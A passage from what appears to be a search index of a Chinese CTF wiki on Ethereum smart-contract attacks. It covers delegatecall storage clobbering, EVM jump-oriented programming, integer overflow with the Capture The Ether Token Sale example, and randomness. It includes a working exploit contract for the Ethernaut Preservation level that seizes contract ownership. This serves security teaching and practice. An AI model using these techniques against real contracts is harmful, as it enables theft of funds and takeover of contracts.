\u53d8\u91cf\u65f6\u4f9d\u636e\u5e76\u4e0d\u662f\u53d8\u91cf\u540d\uff0c\u800c\u662f\u53d8\u91cf\u7684\u5b58\u50a8\u4f4d\uff0c\u8fd9\u6837\u7684\u8bdd\u6211\u4eec\u5c31\u53ef\u4ee5\u8fbe\u5230\u8986\u76d6\u76f8\u5173\u53d8\u91cf\u7684\u76ee\u7684\u3002","title":"\u539f\u56e0\u5206\u6790"},{"location":"blockchain/ethereum/attacks/delegatecall/#_8","text":"","title":"\u4f8b\u5b50"},{"location":"blockchain/ethereum/attacks/delegatecall/#source","text":"ethernaut \u7b2c 16 \u9898","title":"Source"},{"location":"blockchain/ethereum/attacks/delegatecall/#analyse","text":"\u6211\u4eec\u8c03\u7528 Preservation \u7684 setFirstTime \u51fd\u6570\u5b9e\u9645\u901a\u8fc7 delegatecall \u6267\u884c\u4e86 LibraryContract \u7684 setTime \u51fd\u6570\uff0c\u4fee\u6539\u4e86 slot 1 \uff0c\u4e5f\u5c31\u662f\u4fee\u6539\u4e86 timeZone1Library \u53d8\u91cf \u8fd9\u6837\uff0c\u6211\u4eec\u7b2c\u4e00\u6b21\u8c03\u7528 setFirstTime \u5c06 timeZone1Library \u53d8\u91cf\u4fee\u6539\u4e3a\u6211\u4eec\u7684\u6076\u610f\u5408\u7ea6\u7684\u5730\u5740\uff0c\u7b2c\u4e8c\u6b21\u8c03\u7528 setFirstTime \u5c31\u53ef\u4ee5\u6267\u884c\u6211\u4eec\u7684\u4efb\u610f\u4ee3\u7801\u4e86","title":"Analyse"},{"location":"blockchain/ethereum/attacks/delegatecall/#exp","text":"pragma solidity ^ 0.4.23 ; contract Preservation { // public library contracts address public timeZone1Library ; address public timeZone2Library ; address public owner ; uint storedTime ; // Sets the function signature for delegatecall bytes4 constant setTimeSignature = bytes4 ( keccak256 ( \"setTime(uint256)\" )); constructor ( address _timeZone1LibraryAddress , address _timeZone2LibraryAddress ) public { timeZone1Library = _timeZone1LibraryAddress ; timeZone2Library = _timeZone2LibraryAddress ; owner = msg.sender ; } // set the time for timezone 1 function setFirstTime ( uint _timeStamp ) public { timeZone1Library . delegatecall ( setTimeSignature , _timeStamp ); } // set the time for timezone 2 function setSecondTime ( uint _timeStamp ) public { timeZone2Library . delegatecall ( setTimeSignature , _timeStamp ); } } // Simple library contract to set the time contract LibraryContract { // stores a timestamp uint storedTime ; function setTime ( uint _time ) public { storedTime = _time ; } } contract attack { address public timeZone1Library ; address public timeZone2Library ; address public owner ; address instance_address = 0x7cec052e622c0fb68ca3b2e3c899b8bf8b78663c ; Preservation target = Preservation ( instance_address ); function attack1 () { target . setFirstTime ( uint ( address ( this ))); } function attack2 () { target . setFirstTime ( uint ( 0x88d3052d12527f1fbe3a6e1444ea72c4ddb396c2 )); } function setTime ( uint _time ) public { timeZone1Library = address ( _time ); timeZone2Library = address ( _time ); owner = address ( _time ); } } \u5148\u8c03\u7528 attack1() \uff0c\u518d\u8c03\u7528 attack2() \u5373\u53ef","title":"Exp"},{"location":"blockchain/ethereum/attacks/delegatecall/#result","text":"","title":"Result"},{"location":"blockchain/ethereum/attacks/delegatecall/#_9","text":"","title":"\u9898\u76ee"},{"location":"blockchain/ethereum/attacks/delegatecall/#realworld-2018","text":"\u9898\u76ee\u540d\u79f0 Acoraida Monica","title":"RealWorld 2018"},{"location":"blockchain/ethereum/attacks/delegatecall/#balsn-2019","text":"\u9898\u76ee\u540d\u79f0 Creativity","title":"Balsn 2019"},{"location":"blockchain/ethereum/attacks/delegatecall/#2020","text":"\u9898\u76ee\u540d\u79f0 SafeDelegatecall","title":"\u7b2c\u4e94\u7a7a\u95f4 2020"},{"location":"blockchain/ethereum/attacks/delegatecall/#2020_1","text":"\u9898\u76ee\u540d\u79f0 boxgame Note \u6ce8\uff1a\u9898\u76ee\u9644\u4ef6\u76f8\u5173\u5185\u5bb9\u53ef\u81f3 ctf-challenges/blockchain \u4ed3\u5e93\u5bfb\u627e\u3002","title":"\u534e\u4e3a\u9cb2\u9e4f\u8ba1\u7b97 2020"},{"location":"blockchain/ethereum/attacks/introduction/","text":"Introduction \u00b6 \u8fd9\u90e8\u5206\u4ecb\u7ecd\u76f8\u5173\u6f0f\u6d1e\u6216\u8005\u653b\u51fb\u65b9\u5f0f\uff0c\u6587\u7ae0\u4e2d\u6709\u5173\u4e8e\u9898\u76ee\u9644\u4ef6\u76f8\u5173\u5185\u5bb9\u53ef\u81f3 ctf-challenges/blockchain \u4ed3\u5e93\u5bfb\u627e\u3002","title":"Introduction"},{"location":"blockchain/ethereum/attacks/introduction/#introduction","text":"\u8fd9\u90e8\u5206\u4ecb\u7ecd\u76f8\u5173\u6f0f\u6d1e\u6216\u8005\u653b\u51fb\u65b9\u5f0f\uff0c\u6587\u7ae0\u4e2d\u6709\u5173\u4e8e\u9898\u76ee\u9644\u4ef6\u76f8\u5173\u5185\u5bb9\u53ef\u81f3 ctf-challenges/blockchain \u4ed3\u5e93\u5bfb\u627e\u3002","title":"Introduction"},{"location":"blockchain/ethereum/attacks/jump-oriented-programming/","text":"Jump Oriented Programming \u00b6 \u539f\u7406 \u00b6 \u7c7b\u4f3c\u4e8e pwn \u4e2d\u7684 ROP\uff0cEVM \u4e2d\u4e5f\u6709 JOP\uff08Jump Oriented Programming\uff09\u3002JOP \u7684\u601d\u60f3\u548c ROP \u662f\u76f8\u4f3c\u7684\uff1a\u4e32\u8054\u8d77\u4e00\u4e2a\u4e2a\u5c0f\u7684\u4ee3\u7801\u7247\u6bb5\uff08gadget\uff09\uff0c\u8fbe\u6210\u4e00\u5b9a\u7684\u76ee\u7684\u3002 \u6765\u770b EVM \u7684\u51e0\u4e2a\u5b57\u8282\u7801\uff1a 0x56 JUMP 0x57 JUMPI 0x5B JUMPDEST 0x5c BEGINSUB 0x5d RETURNSUB 0x5e JUMPSUB \u5728 EVM \u4e2d\u7684\u65e0\u6761\u4ef6\u8df3\u8f6c JUMP \u548c\u6761\u4ef6\u8df3\u8f6c JUMPI \u7684\u76ee\u7684\u5730\u90fd\u5fc5\u987b\u662f JUMPDEST \uff0c\u8fd9\u70b9\u548c ROP \u53ef\u4ee5\u4efb\u9009\u8fd4\u56de\u5730\u5740\u4e0d\u540c\u3002\u4e0e SUB \u76f8\u5173\u7684\u4e09\u4e2a\u5b57\u8282\u7801\u662f\u540e\u671f\u65b0\u589e\u7684\u6807\u51c6\uff0c JUMPSUB \u548c JUMP \u76f8\u4f3c\uff0c\u53ea\u662f\u8df3\u8f6c\u7684\u76ee\u7684\u5730\u5fc5\u987b\u662f BEGINSUB \uff1b\u800c RETURNSUB \u76f8\u5f53\u4e8e ROP \u4e2d\u7684 ret \uff0c\u5bf9\u76ee\u6807\u5730\u5740\u6ca1\u6709\u9650\u5236\u3002 \u53e6\u5916\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0cEVM \u867d\u7136\u4f7f\u7528\u7684\u662f\u53d8\u957f\u6307\u4ee4\uff0c\u4f46\u662f\u4e0d\u5141\u8bb8\u50cf ROP \u90a3\u6837\u8df3\u5230\u4e00\u6761\u6307\u4ee4\u7684\u4e2d\u95f4\u3002\u6bd4\u5982 64 \u4f4d\u7684 pop r15 \u662f A_ \uff0cROP \u65f6\u76f4\u63a5\u843d\u5728\u7b2c\u4e8c\u4e2a\u5b57\u8282\u5219\u53ef\u4ee5\u5f53\u6210 pop rdi \u4f7f\u7528\uff1bEVM PUSH1 0x5B \u4e2d\u7684 0x5B \u5219\u4e0d\u80fd\u5f53\u4f5c JUMPDEST \u4f7f\u7528\u3002 \u901a\u5e38\u9700\u8981\u7528\u5230 JOP \u7684\u5408\u7ea6\u5728\u7f16\u5199\u65f6\u90fd\u5939\u6742\u7740\u5185\u8054\u6c47\u7f16\u7684\u540e\u95e8\uff0c\u9700\u8981\u4eba\u5de5\u9006\u5411\u8bc6\u522b\u67e5\u627e\u4e24\u6837\u4e1c\u897f\uff1a \u901a\u5e38\u63a7\u5236\u6d41\u53ef\u8fbe\u3001\u53ef\u4ee5\u63a7\u5236\u8df3\u8f6c\u5730\u5740\u7684\u8d77\u70b9 JUMPDEST \u4e4b\u540e\u5b9e\u73b0\u4e86\u4e00\u4e9b\u7279\u6b8a\u529f\u80fd\uff0c\u7136\u540e\u518d\u63a5\u4e00\u4e2a JUMP \u6307\u4ee4\u7684\u5404\u79cd gadget gadget \u9700\u8981\u5b9e\u73b0\u7684\u529f\u80fd\u56e0\u9898\u76ee\u8981\u6c42\u6216\u8003\u5bdf\u70b9\u800c\u5f02\uff0c\u6bd4\u5982\u8981\u5b9e\u73b0\u4e00\u4e2a\u5916\u90e8\u5408\u7ea6\u7684\u8c03\u7528\uff0c\u5c31\u8981\u5148\u6309\u7167\u987a\u5e8f\u5c06\u5404\u79cd\u504f\u79fb\u3001gas\u7b49\u6570\u636e\u5e03\u7f6e\u5728\u6808\u4e0a\u3002\u5728 JOP \u7684\u6700\u540e\u9700\u8981\u4e00\u4e2a JUMPDEST; STOP \u4f5c\u4e3a\u7ed3\u675f\u7684\u7740\u9646\u70b9\uff0c\u5426\u5219\u4e00\u65e6\u6267\u884c\u51fa\u9519\u5c31\u4f1a\u5bfc\u81f4\u4ea4\u6613\u56de\u6eda\u3002 \u9898\u76ee \u00b6 RealWorldCTF Final 2018 \u00b6 \u9898\u76ee\u540d\u79f0 Acoraida Monica RealWorldCTF 3 rd 2021 \u00b6 \u9898\u76ee\u540d\u79f0 Re: Montagy Note \u6ce8\uff1a\u9898\u76ee\u9644\u4ef6\u76f8\u5173\u5185\u5bb9\u53ef\u81f3 ctf-challenges/blockchain \u4ed3\u5e93\u5bfb\u627e\u3002","title":"Jump Oriented Programming"},{"location":"blockchain/ethereum/attacks/jump-oriented-programming/#jump-oriented-programming","text":"","title":"Jump Oriented Programming"},{"location":"blockchain/ethereum/attacks/jump-oriented-programming/#_1","text":"\u7c7b\u4f3c\u4e8e pwn \u4e2d\u7684 ROP\uff0cEVM \u4e2d\u4e5f\u6709 JOP\uff08Jump Oriented Programming\uff09\u3002JOP \u7684\u601d\u60f3\u548c ROP \u662f\u76f8\u4f3c\u7684\uff1a\u4e32\u8054\u8d77\u4e00\u4e2a\u4e2a\u5c0f\u7684\u4ee3\u7801\u7247\u6bb5\uff08gadget\uff09\uff0c\u8fbe\u6210\u4e00\u5b9a\u7684\u76ee\u7684\u3002 \u6765\u770b EVM \u7684\u51e0\u4e2a\u5b57\u8282\u7801\uff1a 0x56 JUMP 0x57 JUMPI 0x5B JUMPDEST 0x5c BEGINSUB 0x5d RETURNSUB 0x5e JUMPSUB \u5728 EVM \u4e2d\u7684\u65e0\u6761\u4ef6\u8df3\u8f6c JUMP \u548c\u6761\u4ef6\u8df3\u8f6c JUMPI \u7684\u76ee\u7684\u5730\u90fd\u5fc5\u987b\u662f JUMPDEST \uff0c\u8fd9\u70b9\u548c ROP \u53ef\u4ee5\u4efb\u9009\u8fd4\u56de\u5730\u5740\u4e0d\u540c\u3002\u4e0e SUB \u76f8\u5173\u7684\u4e09\u4e2a\u5b57\u8282\u7801\u662f\u540e\u671f\u65b0\u589e\u7684\u6807\u51c6\uff0c JUMPSUB \u548c JUMP \u76f8\u4f3c\uff0c\u53ea\u662f\u8df3\u8f6c\u7684\u76ee\u7684\u5730\u5fc5\u987b\u662f BEGINSUB \uff1b\u800c RETURNSUB \u76f8\u5f53\u4e8e ROP \u4e2d\u7684 ret \uff0c\u5bf9\u76ee\u6807\u5730\u5740\u6ca1\u6709\u9650\u5236\u3002 \u53e6\u5916\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0cEVM \u867d\u7136\u4f7f\u7528\u7684\u662f\u53d8\u957f\u6307\u4ee4\uff0c\u4f46\u662f\u4e0d\u5141\u8bb8\u50cf ROP \u90a3\u6837\u8df3\u5230\u4e00\u6761\u6307\u4ee4\u7684\u4e2d\u95f4\u3002\u6bd4\u5982 64 \u4f4d\u7684 pop r15 \u662f A_ \uff0cROP \u65f6\u76f4\u63a5\u843d\u5728\u7b2c\u4e8c\u4e2a\u5b57\u8282\u5219\u53ef\u4ee5\u5f53\u6210 pop rdi \u4f7f\u7528\uff1bEVM PUSH1 0x5B \u4e2d\u7684 0x5B \u5219\u4e0d\u80fd\u5f53\u4f5c JUMPDEST \u4f7f\u7528\u3002 \u901a\u5e38\u9700\u8981\u7528\u5230 JOP \u7684\u5408\u7ea6\u5728\u7f16\u5199\u65f6\u90fd\u5939\u6742\u7740\u5185\u8054\u6c47\u7f16\u7684\u540e\u95e8\uff0c\u9700\u8981\u4eba\u5de5\u9006\u5411\u8bc6\u522b\u67e5\u627e\u4e24\u6837\u4e1c\u897f\uff1a \u901a\u5e38\u63a7\u5236\u6d41\u53ef\u8fbe\u3001\u53ef\u4ee5\u63a7\u5236\u8df3\u8f6c\u5730\u5740\u7684\u8d77\u70b9 JUMPDEST \u4e4b\u540e\u5b9e\u73b0\u4e86\u4e00\u4e9b\u7279\u6b8a\u529f\u80fd\uff0c\u7136\u540e\u518d\u63a5\u4e00\u4e2a JUMP \u6307\u4ee4\u7684\u5404\u79cd gadget gadget \u9700\u8981\u5b9e\u73b0\u7684\u529f\u80fd\u56e0\u9898\u76ee\u8981\u6c42\u6216\u8003\u5bdf\u70b9\u800c\u5f02\uff0c\u6bd4\u5982\u8981\u5b9e\u73b0\u4e00\u4e2a\u5916\u90e8\u5408\u7ea6\u7684\u8c03\u7528\uff0c\u5c31\u8981\u5148\u6309\u7167\u987a\u5e8f\u5c06\u5404\u79cd\u504f\u79fb\u3001gas\u7b49\u6570\u636e\u5e03\u7f6e\u5728\u6808\u4e0a\u3002\u5728 JOP \u7684\u6700\u540e\u9700\u8981\u4e00\u4e2a JUMPDEST; STOP \u4f5c\u4e3a\u7ed3\u675f\u7684\u7740\u9646\u70b9\uff0c\u5426\u5219\u4e00\u65e6\u6267\u884c\u51fa\u9519\u5c31\u4f1a\u5bfc\u81f4\u4ea4\u6613\u56de\u6eda\u3002","title":"\u539f\u7406"},{"location":"blockchain/ethereum/attacks/jump-oriented-programming/#_2","text":"","title":"\u9898\u76ee"},{"location":"blockchain/ethereum/attacks/jump-oriented-programming/#realworldctf-final-2018","text":"\u9898\u76ee\u540d\u79f0 Acoraida Monica","title":"RealWorldCTF Final 2018"},{"location":"blockchain/ethereum/attacks/jump-oriented-programming/#realworldctf-3rd-2021","text":"\u9898\u76ee\u540d\u79f0 Re: Montagy Note \u6ce8\uff1a\u9898\u76ee\u9644\u4ef6\u76f8\u5173\u5185\u5bb9\u53ef\u81f3 ctf-challenges/blockchain \u4ed3\u5e93\u5bfb\u627e\u3002","title":"RealWorldCTF 3rd 2021"},{"location":"blockchain/ethereum/attacks/overflow-underflow/","text":"Integer Overflow and Underflow \u00b6 \u539f\u7406 \u00b6 EVM\u7684\u6574\u6570\u6709 int \u548c uint \u4e24\u79cd\uff0c\u5bf9\u5e94\u6709\u65e0\u7b26\u53f7\u7684\u60c5\u51b5\u3002\u5728 int \u6216 uint \u540e\u53ef\u4ee5\u8ddf\u968f\u4e00\u4e2a8\u7684\u500d\u6570\uff0c\u8868\u793a\u8be5\u6574\u6570\u7684\u4f4d\u6570\uff0c\u59828\u4f4d\u7684 uint8 \u3002\u4f4d\u6570\u4e0a\u9650\u4e3a256\u4f4d\uff0c int \u548c uint \u5206\u522b\u662f int256 \u548c uint256 \u7684\u522b\u540d\uff0c\u4e00\u822c uint \u4f7f\u7528\u7684\u66f4\u591a\u3002 \u5728\u6574\u6570\u8d85\u51fa\u4f4d\u6570\u7684\u4e0a\u9650\u6216\u4e0b\u9650\u65f6\uff0c\u5c31\u4f1a\u9759\u9ed8\u5730\u8fdb\u884c\u53d6\u6a21\u64cd\u4f5c\u3002\u901a\u5e38\u6211\u4eec\u5e0c\u671b\u8d39\u7528\u5411\u4e0a\u6ea2\u51fa\u53d8\u5c0f\uff0c\u6216\u8005\u5b58\u6b3e\u5411\u4e0b\u6ea2\u51fa\u53d8\u5927\u3002\u6574\u6570\u6ea2\u51fa\u6f0f\u6d1e\u53ef\u4ee5\u4f7f\u7528 SafeMath \u5e93\u6765\u9632\u5fa1\uff0c\u5f53\u53d1\u751f\u6ea2\u51fa\u65f6\u4f1a\u56de\u6eda\u4ea4\u6613\u3002 \u4f8b\u5b50 \u00b6 \u4ee5 Capture The Ether \u7684 Token sale \u4e3a\u4f8b\uff1a pragma solidity ^ 0.4.21 ; contract TokenSaleChallenge { mapping ( address => uint256 ) public balanceOf ; uint256 constant PRICE_PER_TOKEN = 1 ether ; function TokenSaleChallenge ( address _player ) public payable { require ( msg.value == 1 ether ); } function isComplete () public view returns ( bool ) { return address ( this ). balance < 1 ether ; } function buy ( uint256 numTokens ) public payable { require ( msg.value == numTokens * PRICE_PER_TOKEN ); balanceOf [ msg.sender ] += numTokens ; } function sell ( uint256 numTokens ) public { require ( balanceOf [ msg.sender ] >= numTokens ); balanceOf [ msg.sender ] -= numTokens ; msg.sender . transfer ( numTokens * PRICE_PER_TOKEN ); } } \u5728\u672c\u9898\u4e2d\uff0c\u8d2d\u4e70\u5355\u4e2a\u4ee3\u5e01\u9700\u8981\u652f\u4ed8 1 ether\uff0c\u5373 msg.value == numTokens * PRICE_PER_TOKEN \u3002\u5728EVM\u4e2d\uff0c\u8d27\u5e01\u4ee5 wei \u4e3a\u5355\u4f4d\uff0c1 ether \u5b9e\u9645\u4e0a\u662f 10 ^ { 18 } 10 ^ { 18 } wei\uff0c\u5373 0xde0b6b3a7640000 wei\u3002\u5982\u679c\u8ba9\u8fd9\u91cc\u7684 numTokens \u5927\u4e00\u4e9b\uff0c\u4e58\u79ef\u5c31\u53ef\u80fd\u6ea2\u51fa\u3002\u4f8b\u5982\u6211\u4eec\u8d2d\u4e70 2 ^ { 256 } // 10 ^ { 18 } + 1 2 ^ { 256 } // 10 ^ { 18 } + 1 \u4e2a\u4ee3\u5e01\uff0c\u4e58\u4e0a 10 ^ { 18 } 10 ^ { 18 } \u540e\u5c31\u53d1\u751f\u4e86\u6ea2\u51fa\uff0c\u6700\u7ec8\u82b1\u8d39\u4ec5\u7ea6 0.4 ether \u5c31\u4e70\u5230\u4e86\u5927\u91cf\u4ee3\u5e01\u3002\u7136\u540e\u6211\u4eec\u5c06\u4e70\u5230\u7684\u4ee3\u5e01\u90e8\u5206\u5356\u51fa\uff0c\u5373\u53ef\u5b8c\u6210\u9898\u76ee\u8981\u6c42\u3002 \u6574\u6570\u4e0b\u6ea2\u7684\u4e00\u4e2a\u4f8b\u5b50\u662f\u51cf\u6cd5\u64cd\u4f5c\u3002\u5047\u8bbe\u6709\u4e00\u4e2a\u5408\u7ea6\u5b9e\u73b0\u4e86\u5982\u4e0b\u529f\u80fd\uff1a contract Bank { mapping ( address => uint256 ) public balanceOf ; ... function withdraw ( uint256 amount ) public { require ( balanceOf [ msg.sender ] - amount >= 0 ); balanceOf [ msg.sender ] -= amount ; msg.sender . send . value ( amount )(); } } \u4e4d\u770b\u4e4b\u4e0b\u6ca1\u6709\u95ee\u9898\uff0c\u5b9e\u9645\u4e0a require \u4e00\u884c\uff0c balanceOf[msg.sender]-amount \u7684\u7ed3\u679c\u4f5c\u4e3a\u65e0\u7b26\u53f7\u6574\u6570\uff0c\u6c38\u8fdc\u662f\u5927\u4e8e\u7b49\u4e8e 0 \u7684\uff0c\u5bfc\u81f4\u6211\u4eec\u53ef\u4ee5\u4efb\u610f\u53d6\u6b3e\u3002\u6b63\u786e\u7684\u5199\u6cd5\u662f require(balanceOf[msg.sender] >= amount) \u3002 \u6574\u6570\u4e0b\u6ea2\u7684\u53e6\u4e00\u4e2a\u4f8b\u5b50\u4e0e\u91cd\u5165\u653b\u51fb\u6709\u5173\uff0c\u5982\u5c06\u6301\u6709\u6570\u4e3a 1 \u7684\u7269\u54c1\u5356\u51fa\u4e24\u6b21\uff0c\u6216\u8005\u5c06 1 ether \u5b58\u6b3e\u53d6\u51fa\u4e24\u6b21\uff0c\u5bfc\u81f4\u7ed3\u679c\u4e3a\u8d1f\u6570\uff0c\u50a8\u5b58\u4e3a uint \u5219\u4e3a\u5de8\u5927\u7684\u6b63\u6570\u3002 \u9898\u76ee \u00b6 \u7edd\u5927\u90e8\u5206\u91cd\u5165\u653b\u51fb\u7684\u9898\u76ee\u90fd\u6d89\u53ca\u5230\u5411\u4e0b\u6ea2\u51fa\uff0c\u53ef\u53c2\u7167\u91cd\u5165\u653b\u51fb\u7684\u90e8\u5206\u3002\u4e0d\u6d89\u53ca\u91cd\u5165\u653b\u51fb\u7684\u76f8\u5bf9\u8f83\u5c11\uff0c\u53ef\u4ee5\u53c2\u8003\u4ee5\u4e0b\u9898\u76ee\u3002 ByteCTF 2019 \u00b6 \u9898\u76ee\u540d\u79f0 hf \u9898\u76ee\u540d\u79f0 bet Note \u6ce8\uff1a\u9898\u76ee\u9644\u4ef6\u76f8\u5173\u5185\u5bb9\u53ef\u81f3 ctf-challenges/blockchain \u4ed3\u5e93\u5bfb\u627e\u3002","title":"Integer Overflow and Underflow"},{"location":"blockchain/ethereum/attacks/overflow-underflow/#integer-overflow-and-underflow","text":"","title":"Integer Overflow and Underflow"},{"location":"blockchain/ethereum/attacks/overflow-underflow/#_1","text":"EVM\u7684\u6574\u6570\u6709 int \u548c uint \u4e24\u79cd\uff0c\u5bf9\u5e94\u6709\u65e0\u7b26\u53f7\u7684\u60c5\u51b5\u3002\u5728 int \u6216 uint \u540e\u53ef\u4ee5\u8ddf\u968f\u4e00\u4e2a8\u7684\u500d\u6570\uff0c\u8868\u793a\u8be5\u6574\u6570\u7684\u4f4d\u6570\uff0c\u59828\u4f4d\u7684 uint8 \u3002\u4f4d\u6570\u4e0a\u9650\u4e3a256\u4f4d\uff0c int \u548c uint \u5206\u522b\u662f int256 \u548c uint256 \u7684\u522b\u540d\uff0c\u4e00\u822c uint \u4f7f\u7528\u7684\u66f4\u591a\u3002 \u5728\u6574\u6570\u8d85\u51fa\u4f4d\u6570\u7684\u4e0a\u9650\u6216\u4e0b\u9650\u65f6\uff0c\u5c31\u4f1a\u9759\u9ed8\u5730\u8fdb\u884c\u53d6\u6a21\u64cd\u4f5c\u3002\u901a\u5e38\u6211\u4eec\u5e0c\u671b\u8d39\u7528\u5411\u4e0a\u6ea2\u51fa\u53d8\u5c0f\uff0c\u6216\u8005\u5b58\u6b3e\u5411\u4e0b\u6ea2\u51fa\u53d8\u5927\u3002\u6574\u6570\u6ea2\u51fa\u6f0f\u6d1e\u53ef\u4ee5\u4f7f\u7528 SafeMath \u5e93\u6765\u9632\u5fa1\uff0c\u5f53\u53d1\u751f\u6ea2\u51fa\u65f6\u4f1a\u56de\u6eda\u4ea4\u6613\u3002","title":"\u539f\u7406"},{"location":"blockchain/ethereum/attacks/overflow-underflow/#_2","text":"\u4ee5 Capture The Ether \u7684 Token sale \u4e3a\u4f8b\uff1a pragma solidity ^ 0.4.21 ; contract TokenSaleChallenge { mapping ( address => uint256 ) public balanceOf ; uint256 constant PRICE_PER_TOKEN = 1 ether ; function TokenSaleChallenge ( address _player ) public payable { require ( msg.value == 1 ether ); } function isComplete () public view returns ( bool ) { return address ( this ). balance < 1 ether ; } function buy ( uint256 numTokens ) public payable { require ( msg.value == numTokens * PRICE_PER_TOKEN ); balanceOf [ msg.sender ] += numTokens ; } function sell ( uint256 numTokens ) public { require ( balanceOf [ msg.sender ] >= numTokens ); balanceOf [ msg.sender ] -= numTokens ; msg.sender . transfer ( numTokens * PRICE_PER_TOKEN ); } } \u5728\u672c\u9898\u4e2d\uff0c\u8d2d\u4e70\u5355\u4e2a\u4ee3\u5e01\u9700\u8981\u652f\u4ed8 1 ether\uff0c\u5373 msg.value == numTokens * PRICE_PER_TOKEN \u3002\u5728EVM\u4e2d\uff0c\u8d27\u5e01\u4ee5 wei \u4e3a\u5355\u4f4d\uff0c1 ether \u5b9e\u9645\u4e0a\u662f 10 ^ { 18 } 10 ^ { 18 } wei\uff0c\u5373 0xde0b6b3a7640000 wei\u3002\u5982\u679c\u8ba9\u8fd9\u91cc\u7684 numTokens \u5927\u4e00\u4e9b\uff0c\u4e58\u79ef\u5c31\u53ef\u80fd\u6ea2\u51fa\u3002\u4f8b\u5982\u6211\u4eec\u8d2d\u4e70 2 ^ { 256 } // 10 ^ { 18 } + 1 2 ^ { 256 } // 10 ^ { 18 } + 1 \u4e2a\u4ee3\u5e01\uff0c\u4e58\u4e0a 10 ^ { 18 } 10 ^ { 18 } \u540e\u5c31\u53d1\u751f\u4e86\u6ea2\u51fa\uff0c\u6700\u7ec8\u82b1\u8d39\u4ec5\u7ea6 0.4 ether \u5c31\u4e70\u5230\u4e86\u5927\u91cf\u4ee3\u5e01\u3002\u7136\u540e\u6211\u4eec\u5c06\u4e70\u5230\u7684\u4ee3\u5e01\u90e8\u5206\u5356\u51fa\uff0c\u5373\u53ef\u5b8c\u6210\u9898\u76ee\u8981\u6c42\u3002 \u6574\u6570\u4e0b\u6ea2\u7684\u4e00\u4e2a\u4f8b\u5b50\u662f\u51cf\u6cd5\u64cd\u4f5c\u3002\u5047\u8bbe\u6709\u4e00\u4e2a\u5408\u7ea6\u5b9e\u73b0\u4e86\u5982\u4e0b\u529f\u80fd\uff1a contract Bank { mapping ( address => uint256 ) public balanceOf ; ... function withdraw ( uint256 amount ) public { require ( balanceOf [ msg.sender ] - amount >= 0 ); balanceOf [ msg.sender ] -= amount ; msg.sender . send . value ( amount )(); } } \u4e4d\u770b\u4e4b\u4e0b\u6ca1\u6709\u95ee\u9898\uff0c\u5b9e\u9645\u4e0a require \u4e00\u884c\uff0c balanceOf[msg.sender]-amount \u7684\u7ed3\u679c\u4f5c\u4e3a\u65e0\u7b26\u53f7\u6574\u6570\uff0c\u6c38\u8fdc\u662f\u5927\u4e8e\u7b49\u4e8e 0 \u7684\uff0c\u5bfc\u81f4\u6211\u4eec\u53ef\u4ee5\u4efb\u610f\u53d6\u6b3e\u3002\u6b63\u786e\u7684\u5199\u6cd5\u662f require(balanceOf[msg.sender] >= amount) \u3002 \u6574\u6570\u4e0b\u6ea2\u7684\u53e6\u4e00\u4e2a\u4f8b\u5b50\u4e0e\u91cd\u5165\u653b\u51fb\u6709\u5173\uff0c\u5982\u5c06\u6301\u6709\u6570\u4e3a 1 \u7684\u7269\u54c1\u5356\u51fa\u4e24\u6b21\uff0c\u6216\u8005\u5c06 1 ether \u5b58\u6b3e\u53d6\u51fa\u4e24\u6b21\uff0c\u5bfc\u81f4\u7ed3\u679c\u4e3a\u8d1f\u6570\uff0c\u50a8\u5b58\u4e3a uint \u5219\u4e3a\u5de8\u5927\u7684\u6b63\u6570\u3002","title":"\u4f8b\u5b50"},{"location":"blockchain/ethereum/attacks/overflow-underflow/#_3","text":"\u7edd\u5927\u90e8\u5206\u91cd\u5165\u653b\u51fb\u7684\u9898\u76ee\u90fd\u6d89\u53ca\u5230\u5411\u4e0b\u6ea2\u51fa\uff0c\u53ef\u53c2\u7167\u91cd\u5165\u653b\u51fb\u7684\u90e8\u5206\u3002\u4e0d\u6d89\u53ca\u91cd\u5165\u653b\u51fb\u7684\u76f8\u5bf9\u8f83\u5c11\uff0c\u53ef\u4ee5\u53c2\u8003\u4ee5\u4e0b\u9898\u76ee\u3002","title":"\u9898\u76ee"},{"location":"blockchain/ethereum/attacks/overflow-underflow/#bytectf-2019","text":"\u9898\u76ee\u540d\u79f0 hf \u9898\u76ee\u540d\u79f0 bet Note \u6ce8\uff1a\u9898\u76ee\u9644\u4ef6\u76f8\u5173\u5185\u5bb9\u53ef\u81f3 ctf-challenges/blockchain \u4ed3\u5e93\u5bfb\u627e\u3002","title":"ByteCTF 2019"},{"location":"blockchain/ethereum/attacks/randomness/","text":"Randomness \u00b6 \u672c\u8282\u8ba8\u8bba\u4ee5\u592a\u574a\u4e2d\u7684\u968f\u673a\u6570\u95ee\u9898\u3002\u7531\u4e8e\u6240\u6709\u4ee5\u592a\u574a\u8282\u70b9\u5728\u9a8c\u8bc1\u4ea4\u6613\u65f6\uff0c\u9700\u8981\u8ba1\u7b97\u51fa\u76f8\u540c\u7684\u7ed3\u679c\u4ee5\u8fbe\u6210\u5171\u8bc6\uff0c\u56e0\u6b64 EVM \u672c\u8eab\u65e0\u6cd5\u5b9e\u73b0\u771f\u968f\u673a\u6570\u7684\u529f\u80fd\u3002\u81f3\u4e8e\u4f2a\u968f\u673a\u6570\uff0c\u5176\u71b5\u6e90\u4e5f\u662f\u53ea\u80fd\u662f\u786e\u5b9a\u503c\u3002\u4e0b\u9762\u8ba8\u8bba\u5404\u79cd\u968f\u673a\u6570\u7684\u5b89\u5168\u6027\uff0c\u5e76\u4ecb\u7ecd\u56de\u6eda\u653b\u51fb\u3002 \u4f7f\u7528\u79c1\u6709\u53d8\u91cf\u7684\u4f2a\u968f\u673a\u6570 \u00b6 \u539f\u7406 \u00b6 \u5408\u7ea6\u4f7f\u7528\u5916\u754c\u672a\u77e5\u7684\u79c1\u6709\u53d8\u91cf\u53c2\u4e0e\u968f\u673a\u6570\u751f\u6210\u3002\u867d\u7136\u53d8\u91cf\u662f\u79c1\u6709\u7684\uff0c\u65e0\u6cd5\u901a\u8fc7\u53e6\u4e00\u5408\u7ea6\u8bbf\u95ee\uff0c\u4f46\u662f\u53d8\u91cf\u50a8\u5b58\u8fdb storage \u4e4b\u540e\u4ecd\u7136\u662f\u516c\u5f00\u7684\u3002\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u533a\u5757\u94fe\u6d4f\u89c8\u5668\uff08\u5982 etherscan\uff09\u89c2\u5bdf storage \u53d8\u52a8\u60c5\u51b5\uff0c\u6216\u8005\u8ba1\u7b97\u53d8\u91cf\u50a8\u5b58\u7684\u4f4d\u7f6e\u5e76\u4f7f\u7528 